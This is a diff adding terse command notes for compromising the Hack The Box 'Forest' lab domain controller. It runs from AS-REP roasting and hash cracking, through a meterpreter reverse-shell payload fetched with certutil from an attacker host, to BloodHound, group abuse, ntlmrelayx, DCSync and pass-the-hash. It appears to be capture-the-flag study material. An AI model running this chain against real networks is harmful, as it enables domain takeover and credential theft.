@@ -1,0 +1,73 @@
+// Based on Rizemon's writeup
+// https://rizemon.github.io/hackthebox/ldap/kerberos/windows/2020/03/22/forest-htb.html
+
+echo "10.10.10.161 forest.htb" >> /etc/hosts
+nmap -sV -sT -sC forest.htb
+cat /etc/host
+	10.10.10.161 forest.htb htb.local
+dig axfr htb.local @10.10.10.161	//as there is DNS server
+ldapsearch -h htb.local -p 389 -x -b "dc=htb,dc=local"		//ldap on 389
+python windapsearch.py -d htb.local -U	//to get ldap info
+cat users.txt
+GetNPUsers.py htb.local/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast
+GetADUsers.py -all htb.local/	//ASREPRoast attack using impacket’s GetNPUsers.py	//got users svc-alfresco, put him in users.txt
+GetNPUsers.py htb.local/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast 	//got pass svc-alfresco:s3rvice!!!
+smbmap -H htb.local -u svc-alfresco -p s3rvice	//no shares
+nmap -sS -p 1-65535 htb.local
+ruby winrm_shell.rb	//got svc-alfresco shell
+  endpoint: 'http://htb.local:5985/wsman',
+  transport: :ssl,
+  user: 'htb.local\svc-alfresco',
+  password: 's3rvice',
+  :no_ssl_peer_verification => true
+
+BloodHound
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.XX.XX LPORT=1337 -f exe > shell.exe
+use exploit/multi/handler
+msfconsole
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.10.XX.XX
+set LPORT 1337
+run
+mkdir httpserver
+cd httpserver
+cp ~/shell.exe .
+python -m SimpleHTTPServer 80
+
+certutil -f -split -urlcache http://10.10.XX.XX/shell.exe	//win
+./shell.exe
+
+upload SharpHound.ps1 .		//meterpreter
+.\SharpHound.ps1
+shell
+powershell
+Import-Module .\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All -Domain htb.local -LDAPUser svc-alfresco -LDAPPass s3rvice
+exit
+exit
+
+download 20191116084214_BloodHound.zip		//meterpreter
+//use belane/bloodhound docker https://github.com/belane/docker-bloodhound
+$ docker run -it \
+
+	-p 7474:7474 \
+	-e DISPLAY=unix$DISPLAY \
+	-v /tmp/.X11-unix:/tmp/.X11-unix \
+	--device=/dev/dri:/dev/dri \
+	--name bloodhound belane/bloodhound
+docker cp 20191116084214_BloodHound.zip bloodhound:/20191116084214_BloodHound.zip
+//search svc-alfresco@htb.local in bloodhound
+//The members of the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL have permissions to modify the DACL (Discretionary Access Control List) on the domain HTB.LOCAL. With write access to the target object's DACL, you can grant yourself any privilege you want on the object.
+
+upload /root/Downloads/PowerView.ps1 .//meterpreter
+Import-Module .\PowerView.ps1
+$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+New-DomainUser -SamAccountName rizemon -AccountPassword $UserPassword
+Add-DomainGroupMember -Identity "Exchange Windows Permissions" -Members 'rizemon'
+
+ntlmrelayx.py -t ldap://htb.local --escalate-user rizemon	//linux
+//we need to get the Exchange Server to perform NTLM authentication to us over HTTP.  there is no Exchange server running on the box! Since we already have a user in the EXCHANGE WINDOWS PERMISSIONS group, we can simply use our own browser to do the authentication
+http://localhost/privexchange
+python secretsdump.py 'htb.local/rizemon:Password123!@htb.local' -just-dc	//got admin hash
+psexec.py Administrator@htb.local -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
